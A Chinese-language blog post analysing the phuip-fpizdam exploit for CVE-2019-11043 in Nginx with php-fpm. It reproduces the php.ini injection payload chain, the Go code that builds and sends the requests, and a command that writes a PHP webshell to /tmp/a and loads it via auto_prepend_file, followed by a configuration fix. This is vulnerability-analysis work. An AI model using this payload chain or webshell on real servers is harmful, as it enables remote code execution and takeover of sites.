---
title: PHP CVE-2019-11043 RCE工具分析
categories:
  - Web安全
tags:
  - Web安全
  - 漏洞分析
toc: true 文章目录
author: BlBana
date: 2019-10-23 22:10:40
description:
comments:
original:
permalink:
---

> 下午看见了CVE-2019-11043漏洞的利用工具，简单的把phuip-fpidam工具看了一下，利用CVE-2019-11043进行php.ini文件的配置改写，再在加载PHP扩展时写入Webshell。

<!-- more -->

# 1. 漏洞描述

PHP官方通告发布，使用Nginx + php-fpm服务器，在默认配置下，存在远程代码执行漏洞。Nginx在fastcgi_split_path_info带有%0a即换行符时，导致PATH_INFO为空，而php-fpm处理PATH_INFO为空，存在缺陷。

# 2. 影响范围

Nginx + php-fpm配置的服务器

# 3. 漏洞原理

具体原理没有分析，需要分析C代码

# 4. 漏洞检测

默认配置下，就可能存在远程代码执行漏洞。

```nginx
location ~ [^/].php(/|$) {
fastcgi_split_path_info ^(.+?.php)(/.*)$;
fastcgi_param PATH_INFO $fastcgi_path_info;
fastcgi_pass php:9000;
```

# 5. 漏洞利用

工具phuip-fpizdam已经可以对目标程序写入WebShell并进行命令执行。

- main.go

在`Detect`函数中，通过遍历的方式获取`params`结构体中的两个参数，`QueryStringLength`和`PisosLength`。调用`Attack`函数并传入结构体params。

- attack.go

在Attack函数中，循环构造并向目标服务器发送`payload`。

```go
# 原始payload如下

var chain = []string{
	"short_open_tag=1",
	"html_errors=0",
	"include_path=/tmp",
	"auto_prepend_file=a",
	"log_errors=1",
	"error_reporting=2",
	"error_log=/tmp/a",
	"extension_dir=\"<?=`\"",
	"extension=\"$_GET[a]`?>\"",
}
```

发送前进行构造：

```go
func MakePathInfo(phpValue string) (string, error) {
	pi := "/PHP_VALUE\n" + phpValue
	if len(pi) > PosOffset {  # PosOffet=34
		return "", fmt.Errorf("php.ini value is too long: %#v", phpValue)
	}
	return pi + strings.Repeat(";", PosOffset-len(pi)), nil
}

# 构造后如下payload
pi = "/PHP_VALUE\nshort_open_tag=1"+";;;;;;;"
```

发送构造的`payload`：

```go
func SetSettingSingle(requester *Requester, params *AttackParams, setting, queryStringPrefix string) (*http.Response, []byte, error) {
	payload, err := MakePathInfo(setting)
	if err != nil {
		return nil, nil, err
	}
	return requester.RequestWithQueryStringPrefix(payload, params, queryStringPrefix)
}

# payload = "/PHP_VALUE\nshort_open_tag=1"+";;;;;;;"
# params = {qsl: 1790, pisos: 152} 具体数值是这样，没写过Go。。。不知道格式对不对
# queryStringPrefix = "a=/bin/sh+-c+'which+which'&"
```


在`RequestWithQueryStringPrefix`函数中，`payload`被拼接到了URL路径当中，`params.QueryStringLength`用于生成定量的字符`“Q”`与`prefix`进行拼接，`params.PisosLength`放入请求头`D-Pisos`中。

```go
u.Path = u.Path + pathInfo
qslDelta := len(u.EscapedPath()) - len(pathInfo) - len(r.u.EscapedPath())
if qslDelta%2 != 0 {
	panic(fmt.Errorf("got odd qslDelta, that means the URL encoding gone wrong: pathInfo=%#v, qslDelta=%#v", qslDelta))
}
qslPrime := params.QueryStringLength - qslDelta/2 - len(prefix)
if qslPrime < 0 {
	return nil, nil, fmt.Errorf("qsl value too small: qsl=%v, qslDelta=%v, prefix=%#v", params.QueryStringLength, qslDelta, prefix)
}
u.RawQuery = prefix + strings.Repeat("Q", qslPrime)
```

发送payload，原始payload被写入到php.ini文件中，参数a后的命令成功执行`/bin/sh+-c+'which+which'&` ，利用配置extension_dir和extension拼接PHP扩展路径在加载PHP扩展时进行命令执行。**（这块具体还不清楚是如何加载并执行了其中的代码，需要留个坑后面补充，继续分析工具调用。。。）**

成功加载扩展并执行命令后，开始写入Webshell。

```shell
cleanupCommand = ";echo '<?php echo `$_GET[a]`;return;?>'>/tmp/a;which which"
```

在/tmp/a文件中写入Webshell。

- 如何加载Webshell

    ```ini
    "include_path=/tmp"  # 配置include时文件路径
    "auto_prepend_file=a"  # 默认在全部PHP文件前面include("/tmp/a")
    ```

- 成功加载Webshell。

在http://localhost/index.php?a=cmd即可执行命令。

# 6. 漏洞修复

不影响业务情况下，可以选择删除下列配置：

```nginx
fastcgi_split_path_info ^(.+?.php)(/.*)$;
fastcgi_param PATH_INFO $fastcgi_path_info;
```

# 7. 参考链接

- [phuip-fpizdam工具](https://github.com/neex/phuip-fpizdam)
- [Vulhub漏洞环境](https://github.com/vulhub/vulhub/tree/master/php/CVE-2019-11043)
- [PHP官方公告](https://bugs.php.net/bug.php?id=78599)